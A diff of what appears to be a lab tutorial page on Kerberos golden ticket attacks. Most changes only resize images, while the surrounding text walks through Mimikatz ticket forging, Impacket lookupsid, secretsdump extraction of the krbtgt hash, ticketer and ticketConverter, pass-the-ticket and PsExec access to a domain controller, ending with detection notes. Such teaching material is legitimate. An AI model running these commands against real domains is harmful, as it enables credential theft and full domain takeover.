@@ -47,13 +47,13 @@ generate the ticket for impersonating user with RID 500.
 ```
 kerberos::golden /domain:karim.net /sid:S-1-5-21-750046758-1551849808-2392872301 /rc4:564e72d3c6c1927de1d2f252665e7c54  /user:admin /id:500 /ptt
 ```
-<img src="/img/golden/m1.PNG" alt="Getting-gz" width="800" height="150"> 
+<img src="/img/golden/m1.PNG" alt="Getting-gz" width="1000" height="200"> 
 get a new cmd prompt which will allow to connect with domain server using PsExec.exe
 
 ```
 PsExec64.exe \\10.0.0.1 powershell.exe
 ```
-<img src="/img/golden/connectm.PNG" alt="Getting-gz" width="800" height="150"> 
+<img src="/img/golden/connectm.PNG" alt="Getting-gz" width="1000" height="200"> 
 
 ## golden ticket with Impacket
 used for lookupid python script to enumerate the Domain SID.
@@ -62,14 +62,14 @@ python3 lookupsid.py user/Administrator:password@ip
 python3 lookupsid.py admin/Administrator:p@ssw0rd@192.168.128.140
 ```
 
-<img src="/img/golden/sidk.PNG" alt="Getting-gz" width="800" height="150"> 
+<img src="/img/golden/sidk.PNG" alt="Getting-gz"width="1000" height="200"> 
 
 used secretsdump.py the python script for extracting Krbtgt hash
 ```
 python3 secretsdump.py administrator:p@ssw0rd@192.168.128.140 -outputfile krbhash -user-status   
 ```
 
-<img src="/img/golden/secretdump.PNG" alt="Getting-gz" width="800" height="150"> 
+<img src="/img/golden/secretdump.PNG" alt="Getting-gz" width="1000" height="200"> 
 
 Use ticketer.py script that will create TGT/TGS tickets,Tickets duration is fixed to 10 years from now.
 ```
@@ -77,29 +77,29 @@ sudo ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -
 sudo python3 ticketer.py -nthash 564e72d3c6c1927de1d2f252665e7c54 -domain-sid S-1-5-21-750046758-1551849808-2392872301 -domain karim.net admin
 ```
 
-<img src="/img/golden/crer.PNG" alt="Getting-gz" width="800" height="150"> 
+<img src="/img/golden/crer.PNG" alt="Getting-gz" width="1000" height="200"> 
 
 Use ticket_converter.py script which will convert kirbi files into ccache file
 ```
 sudo python3 ticketConverter.py admin.ccache ticket.kirbi  
 ```
 
-<img src="/img/golden/convert.PNG" alt="Getting-gz" width="800" height="150"> 
+<img src="/img/golden/convert.PNG" alt="Getting-gz" width="1000" height="200"> 
 
- whenever you want to access the Domain server service you can use the ticket.kirbi file
+whenever you want to access the Domain server service you can use the ticket.kirbi file
 ```
 kerberos::ptt ticket.kirbi
 misc::cmd
 ```
 
-<img src="/img/golden/connect1.PNG" alt="Getting-gz" width="800" height="150"> 
+<img src="/img/golden/connect1.PNG" alt="Getting-gz" width="1000" height="200"> 
 * get a new cmd prompt which will allow to connect with domain server using PsExec.exe
 access the service.
 ```
 PsExec64.exe \\10.0.0.1 cmd.exe
 ```
 
-<img src="/img/golden/hh.PNG" alt="Getting-gz" width="800" height="150"> 
+<img src="/img/golden/hh.PNG" alt="Getting-gz"width="1000" height="200"> 
 
 ## Detection
  * detecting a golden ticket attack depends on the method used. If the Mimikatz tool was dropped in your environment, antivirus might identify and block it. That said, Mimikatz itself is very simple to modify, changing its hash and invalidating any hash-based detection. 
